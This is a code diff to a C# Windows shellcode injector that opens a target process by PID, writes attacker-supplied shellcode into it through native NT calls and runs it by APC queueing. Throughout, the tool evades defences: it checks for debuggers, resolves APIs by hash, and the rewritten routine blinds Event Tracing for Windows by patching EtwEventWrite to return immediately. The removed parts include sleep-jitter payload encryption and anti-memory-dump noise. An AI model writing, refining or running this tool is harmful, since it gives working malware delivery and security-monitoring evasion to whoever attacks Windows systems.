@@ -80,8 +80,7 @@ class Program
 
     const uint MEM_COMMIT = 0x00001000;
     const uint MEM_RESERVE = 0x00002000;
-    
-    const uint PAGE_EXECUTE_READWRITE = 0x40;
+
     const uint PAGE_READWRITE = 0x04;
     const uint PAGE_EXECUTE_READ = 0x20;
 
@@ -112,142 +111,40 @@ class Program
         public IntPtr UniqueThread;
     }
 
-    static byte[] LoadShellcode(string input)
+    static byte[] LoadCode(string input)
     {
-        input = input.Trim();
-
         if (input.StartsWith("0x"))
             return Convert.FromHexString(input.Substring(2));
-
-        if (input.Contains('+') || input.Contains('/'))
-            return Convert.FromBase64String(input);
-
         if (File.Exists(input))
             return File.ReadAllBytes(input);
-
-        return Convert.FromHexString(input);
+        if (System.Text.RegularExpressions.Regex.IsMatch(input, @"^[0-9a-fA-F]+$") && input.Length % 2 == 0)
+            return Convert.FromHexString(input);
+        return Convert.FromBase64String(input);
     }
 
-    static void PatchETWcall()
+    static void PatchETWCall()
     {
-        IntPtr etwEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
+        IntPtr ntdll = GetModuleHandle("ntdll.dll");
+        if (ntdll == IntPtr.Zero) return;
 
-        for (byte offset = 0; offset <= 100; offset++)
+        IntPtr etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
+        if (etwEventWrite == IntPtr.Zero) return;
+
+        uint oldProtect;
+        bool success = VirtualProtect(etwEventWrite, 1, 0x40, out oldProtect);
+
+        if (!success)
         {
-            byte[] bytes = new byte[10];
-            Marshal.Copy(etwEventWrite + offset, bytes, 0, 10);
-
-            if (bytes[0] == 0xE8 && bytes[9] == 0xC3)
-            {
-                byte[] patch = { 0x90, 0x90, 0x90, 0x90, 0x90 };
-                IntPtr patchAddr = etwEventWrite + offset;
-
-                uint oldProtect;
-                VirtualProtect(patchAddr, 5, 0x40, out oldProtect);
-                Marshal.Copy(patch, 0, patchAddr, 5);
-                VirtualProtect(patchAddr, 5, oldProtect, out oldProtect);
-
-                Console.WriteLine("[+] ETW call patched successfully");
-                break;
-            }
+            Console.WriteLine("[!] VirtualProtect for ETW patch failed.");
+            return;
         }
+
+        Marshal.WriteByte(etwEventWrite, 0xC3);
+
+        VirtualProtect(etwEventWrite, 1, oldProtect, out oldProtect);
     }
 
-    static byte[][] GenerateKeyChain(int length, int chunks)
-    {
-        Random rnd = new Random();
-        byte[][] keys = new byte[chunks][];
-        int chunkSize = length / chunks;
-
-        for (int chunk = 0; chunk < chunks; chunk++)
-        {
-            int currentSize = (chunk == chunks - 1) ? length - chunk * chunkSize : chunkSize;
-            keys[chunk] = new byte[currentSize];
-            for (int i = 0; i < currentSize; i++)
-                keys[chunk][i] = (byte)rnd.Next(1, 255);
-        }
-        return keys;
-    }
-
-    static byte[] EncryptWithKeyChain(byte[] shellcode, byte[][] keys)
-    {
-        byte[] encrypted = new byte[shellcode.Length];
-        int chunkSize = shellcode.Length / keys.Length;
-
-        for (int chunk = 0; chunk < keys.Length; chunk++)
-        {
-            int start = chunk * chunkSize;
-            int end = (chunk == keys.Length - 1) ? shellcode.Length : start + chunkSize;
-            for (int i = start; i < end; i++)
-                encrypted[i] = (byte)(shellcode[i] ^ keys[chunk][i - start]);
-        }
-        return encrypted;
-    }
-
-    static byte[] SleepJitter(byte[] shellcode)
-    {
-        try
-        {
-            Random rnd = new Random();
-            int initialDelay = rnd.Next(5000, 15000);
-
-            byte[][] keys = GenerateKeyChain(shellcode.Length, 10);
-            byte[] encrypted = EncryptWithKeyChain(shellcode, keys);
-
-            var sw = Stopwatch.StartNew();
-            while (sw.ElapsedMilliseconds < initialDelay)
-            {
-                if (rnd.Next(100) < 10)
-                {
-                    string temp = new string('A', rnd.Next(50, 200));
-                    GC.Collect();
-                }
-                Thread.Sleep(1);
-            }
-
-            int totalChunks = 10;
-            int chunkSize = shellcode.Length / totalChunks;
-
-            for (int chunk = 0; chunk < totalChunks; chunk++)
-            {
-                int start = chunk * chunkSize;
-                int end = (chunk == totalChunks - 1) ? shellcode.Length : start + chunkSize;
-
-                for (int i = start; i < end; i++)
-                {
-                    encrypted[i] = (byte)(encrypted[i] ^ keys[chunk % keys.Length][i - start]);
-                }
-
-                if (chunk < totalChunks - 1)
-                {
-                    int delay = rnd.Next(50, 300);
-                    Thread.Sleep(delay);
-                }
-            }
-
-            return encrypted;
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"Incremental decrypt failed: {ex.Message}");
-            return shellcode;
-        }
-    }
-
-    static void AntiMemoryDump()
-    {
-        Random rnd = new Random();
-        for (int i = 0; i < 100; i++)
-        {
-            IntPtr ptr = Marshal.AllocHGlobal(1024);
-            byte[] random = new byte[1024];
-            rnd.NextBytes(random);
-            Marshal.Copy(random, 0, ptr, 1024);
-            Marshal.FreeHGlobal(ptr);
-        }
-    }
-
-    static void Main()
+    static void Main(string[] args)
     {
         if (System.Diagnostics.Debugger.IsAttached)
         {
@@ -258,16 +155,24 @@ class Program
         CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
         if (isDebuggerPresent) Environment.Exit(0);
 
-        AntiMemoryDump();
-        PatchETWcall();
+        PatchETWCall();
 
         try
         {
-            Console.Write("Enter process name (Check output from any realname-reader script, enter without the .exe extension): ");
-            string procName = Console.ReadLine();
+            if (args.Length == 0 || args[0] == "help" || args[0] == "-h" || args[0] == "--help")
+            {
+                Console.WriteLine("Usage: windows-codeinjector.exe <PID> <hex/base64 string or .bin file>");
+                return;
+            }
 
-            Process[] procs = Process.GetProcessesByName(procName);
-            Process target = procs[0];
+            if (args.Length < 2)
+            {
+                Console.WriteLine("Error: missing shellcode argument.");
+                Console.WriteLine("Usage: windows-codeinjector.exe <PID> <hex/base64 string or .bin file>");
+                return;
+            }
+
+            Process target = Process.GetProcessById(int.Parse(args[0]));
 
             CLIENT_ID cid = new CLIENT_ID
             {
@@ -281,9 +186,7 @@ class Program
                 Attributes = 0x40
             };
 
-            Console.Write("Enter your shellcode (hex/base64/bin file): ");
-            string input = Console.ReadLine();
-            byte[] shellcode = LoadShellcode(input);
+            byte[] code = LoadCode(args[1]);
 
             var ntOpen = DynamicInvoke.GetDelegate<NtOpenProcessDelegate>(HASH_NT_OPEN_PROCESS, true);
             var ntAlloc = DynamicInvoke.GetDelegate<NtAllocateVirtualMemoryDelegate>(HASH_NT_ALLOCATE_VIRTUAL_MEMORY, true);
@@ -296,31 +199,26 @@ class Program
             int processStatus = ntOpen(out hProcess, PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_QUERY_LIMITED_INFORMATION, ref oa, ref cid);
             if (processStatus != 0 || hProcess == IntPtr.Zero)
             {
-                Console.WriteLine($"[!] NtOpenProcess failed: 0x{processStatus:X}. Press any key to exit...");
-                Console.ReadKey();
+                Console.WriteLine($"[!] NtOpenProcess failed: 0x{processStatus:X}");
                 return;
             }
 
             IntPtr baseAddress = IntPtr.Zero;
-            uint regionSize = (uint)shellcode.Length;
+            uint regionSize = (uint)code.Length;
             int allocatedMemStatus = ntAlloc(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if (allocatedMemStatus != 0)
             {
-                Console.WriteLine($"[!] NtAllocateVirtualMemory failed: 0x{allocatedMemStatus:X}. Press any key to exit...");
+                Console.WriteLine($"[!] NtAllocateVirtualMemory failed: 0x{allocatedMemStatus:X}");
                 ntClose(hProcess);
-                Console.ReadKey();
                 return;
             }
-
-            byte[] processedShellcode = SleepJitter(shellcode);
             uint bytesWritten;
-            int writeStatus = ntWrite(hProcess, baseAddress, processedShellcode,
-                                      (uint)processedShellcode.Length, out bytesWritten);
+            int writeStatus = ntWrite(hProcess, baseAddress, code,
+                                      (uint)code.Length, out bytesWritten);
             if (writeStatus != 0)
             {
                 Console.WriteLine($"[!] NtWriteVirtualMemory failed: 0x{writeStatus:X}");
                 ntClose(hProcess);
-                Console.ReadKey();
                 return;
             }
 
@@ -330,7 +228,6 @@ class Program
             {
                 Console.WriteLine($"[!] NtProtectVirtualMemory failed: 0x{protectStatus:X}");
                 ntClose(hProcess);
-                Console.ReadKey();
                 return;
             }
 
@@ -350,9 +247,8 @@ class Program
 
             if (hThread == IntPtr.Zero)
             {
-                Console.WriteLine("[!] No suitable thread found. Press any key to exit...");
+                Console.WriteLine("[!] No suitable thread found.");
                 ntClose(hProcess);
-                Console.ReadKey();
                 return;
             }
 
@@ -368,7 +264,7 @@ class Program
             if (apcStatus == 0)
             {
                 Console.WriteLine("[+] Success");
-                Console.WriteLine($"Bytes written: {shellcode.Length}");
+                Console.WriteLine($"Bytes written: {bytesWritten}");
                 ntClose(hThread);
                 ntClose(hProcess);
             }
@@ -380,10 +276,6 @@ class Program
         catch (Exception ex)
         {
             Console.WriteLine($"An unknown error has occurred: {ex}");
-            Console.ReadKey();
         }
-
-        Console.WriteLine("Press any key to exit...");
-        Console.ReadKey();
     }
 }
